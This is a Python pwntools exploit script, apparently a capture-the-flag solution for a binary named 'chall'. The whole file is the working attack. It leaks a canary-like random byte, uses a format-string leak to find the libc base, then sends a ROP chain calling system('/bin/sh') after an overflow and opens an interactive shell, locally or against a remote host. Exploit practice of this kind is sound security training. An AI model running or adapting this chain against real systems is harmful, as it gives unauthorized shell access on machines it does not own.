#!/usr/bin/env python3

from pwn import *

context.binary = e = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'debug'
gs = '''
# brva 0x124a
brva 0x13B8
'''
def init():
    if args.LOCAL:
        p = e.process()
        gdb.attach(p, gdbscript=gs)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])

    return p

p = init()
p.sendlineafter(b"> ", b"A"*0x40)
p.recvuntil(b"A"*0x40)
leak = u8(p.recv(1))
log.info(f"leak random: {leak}")
p.sendlineafter(b"honks?", str(leak))    
p.sendlineafter("again?", b"%21$p")
p.recvuntil(b"wow ")
leak_libc = int(p.recv(14), 16)
log.info(f"leak libc: {hex(leak_libc)}")
libc_base = leak_libc - 0x93975
libc.address = libc_base
pop_rdi = libc_base + 0x000000000010f75b
pop_rsi = libc_base + 0x0000000000110a4d
pop_rdx_rbx_r12_r13_rbp = libc_base + 0x00000000000b503c
pop_rdi_rbp = libc_base + 0x000000000002a873
payload = flat(
    b"A"*0x178,
    p64(pop_rdi_rbp),
    p64(next(libc.search(b"/bin/sh"))),
    p64(0),
    p64(pop_rsi),
    p64(0),
    p64(pop_rdx_rbx_r12_r13_rbp),
    p64(0)*5,
    libc.sym.system,
)
p.sendafter(b"world?", payload)

p.interactive()